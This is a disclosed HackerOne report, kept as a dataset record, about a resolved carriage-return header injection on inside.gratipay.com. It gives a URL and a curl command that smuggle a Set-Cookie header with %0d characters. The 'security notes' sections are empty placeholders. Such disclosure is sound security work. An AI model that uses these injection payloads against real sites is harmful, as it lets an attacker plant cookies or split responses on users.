---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '143139'
original_report_id: '143139'
title: upgrade Aspen on inside.gratipay.com to pick up CR injection fix
weakness: Cross-site Scripting (XSS) - Generic
team_handle: gratipay
created_at: '2016-06-04T23:05:22.989Z'
disclosed_at: '2017-03-22T22:31:09.767Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# upgrade Aspen on inside.gratipay.com to pick up CR injection fix

## Metadata

- HackerOne Report ID: 143139
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: gratipay
- Disclosed At: 2017-03-22T22:31:09.767Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

1) Using IE11, open DevTools and start network capture
2) visit the following URL:
http://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0dq

3) find a 'qwe' cookie set in the response

There is a 0x0d character injected, which can be used as a header
delimiter in IE.
To see this behaviour using Curl, you can use the following command:
curl -s -v 'http://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0dq' 2>&1|less

Screenshots of Curl output and DevTools are attached.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
